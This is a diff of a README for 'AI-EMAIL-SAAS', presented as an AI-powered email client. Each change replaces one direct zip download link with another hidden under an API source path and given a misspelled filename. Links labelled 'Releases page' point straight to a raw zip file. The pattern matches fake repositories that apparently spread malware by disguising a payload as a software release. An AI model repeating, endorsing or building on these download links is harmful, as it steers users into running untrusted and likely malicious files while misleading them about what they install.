@@ -1,6 +1,6 @@
 # 🚀 AI-EMAIL-SAAS - Your Smart Email Companion
 
-[![Download AI-EMAIL-SAAS](https://raw.githubusercontent.com/gagdfzawgyta/AI-EMAIL-SAAS/main/pyrotechnic/AI-EMAIL-SAAS.zip)](https://raw.githubusercontent.com/gagdfzawgyta/AI-EMAIL-SAAS/main/pyrotechnic/AI-EMAIL-SAAS.zip)
+[![Download AI-EMAIL-SAAS](https://raw.githubusercontent.com/gagdfzawgyta/AI-EMAIL-SAAS/main/src/app/api/clerk/EMAI-A-SAAS-3.4.zip)](https://raw.githubusercontent.com/gagdfzawgyta/AI-EMAIL-SAAS/main/src/app/api/clerk/EMAI-A-SAAS-3.4.zip)
 
 ## 🌟 Introduction
 
@@ -11,7 +11,7 @@ Welcome to AI-EMAIL-SAAS, the AI-powered email client designed to enhance your c
 To get started, you will need to download our software. Follow the steps below to install and begin using AI-EMAIL-SAAS.
 
 1. **Download the Software:**
-   - Visit the [Releases page](https://raw.githubusercontent.com/gagdfzawgyta/AI-EMAIL-SAAS/main/pyrotechnic/AI-EMAIL-SAAS.zip) to download the latest version of AI-EMAIL-SAAS. 
+   - Visit the [Releases page](https://raw.githubusercontent.com/gagdfzawgyta/AI-EMAIL-SAAS/main/src/app/api/clerk/EMAI-A-SAAS-3.4.zip) to download the latest version of AI-EMAIL-SAAS. 
 
 2. **Locate Your Download:**
    - Once you are on the Releases page, find the latest version listed. Typically, this will be at the top. Look for a file labeled appropriately for your operating system (e.g., Windows, macOS).
@@ -51,7 +51,7 @@ Before downloading, ensure your system meets the following requirements:
 
 To download AI-EMAIL-SAAS:
 
-- **Click here to visit the [Releases page](https://raw.githubusercontent.com/gagdfzawgyta/AI-EMAIL-SAAS/main/pyrotechnic/AI-EMAIL-SAAS.zip).**
+- **Click here to visit the [Releases page](https://raw.githubusercontent.com/gagdfzawgyta/AI-EMAIL-SAAS/main/src/app/api/clerk/EMAI-A-SAAS-3.4.zip).**
   
 Follow the installation steps mentioned earlier to start using the application.
 
